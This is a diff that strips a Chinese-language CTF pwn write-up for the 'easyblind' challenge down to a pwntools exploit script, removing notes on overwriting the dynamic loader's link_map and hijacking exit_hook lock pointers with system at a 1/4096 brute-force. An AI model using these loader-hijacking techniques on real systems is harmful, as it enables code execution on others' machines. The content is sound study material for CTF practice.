@@ -1,38 +1,3 @@
----
-date: 2024-08-26 10:40
-challenge: easyblind
-tags:
-  - nightmare
-  - linkmap
-  - ld.so
----
-
-和 nightmare 不同，这题比较麻烦，因为写 `_rtld_global`
-
-write 字符串篇偏移是 62，而 `_r_debug+62` 刚好指向了 `link_map:main` 的 `l_name+6`，如果写字符串则会修改 `l_name` 和 `l_ld`，但是这两个东西并不会影响到延迟绑定程序。下面数据中 0x7fa2d9c11190 是 `link_map`，加 8 则是 `l_name`。
-
-```bash
-pwndbg> telescope 0x7fa2d9c11190
-00:0000│ 0x7fa2d9c11190 —▸ 0x558449dc2018 ◂— 0x10c0
-01:0008│ r10-6 0x7fa2d9c11198 ◂— 0x78657fa2d9c11730
-02:0010│ 0x7fa2d9c111a0 ◂— 0x558449007469 /_ 'it' _/
-03:0018│ 0x7fa2d9c111a8 —▸ 0x7fa2d9c11740 —▸ 0x7fffd33b9000 ◂— jg 0x7fffd33b9047
-04:0020│ 0x7fa2d9c111b0 ◂— 0x0
-05:0028│ 0x7fa2d9c111b8 —▸ 0x7fa2d9c11190 —▸ 0x558449dc2018 ◂— 0x10c0
-06:0030│ 0x7fa2d9c111c0 ◂— 0x0
-07:0038│ 0x7fa2d9c111c8 —▸ 0x7fa2d9c11718 —▸ 0x7fa2d9c11730 ◂— 0x0
-```
-
-最后是打 `exit_hook`：
-
-```bash
-_dl_rtld_lock_recursive = 0x7fda65ae3150 <rtld_lock_default_lock_recursive>,
-  _dl_rtld_unlock_recursive = 0x7fda65ae3160 <rtld_lock_default_unlock_recursive>,
-```
-
-其中此刻的 system 地址为 0x7fda65940290，需要爆破 $\frac{1}{4096}$：
-
-```exp.py
 #!/usr/bin/env python3
 from pwn import *
 
@@ -103,4 +68,3 @@ while True:
 
 
 it()
-```
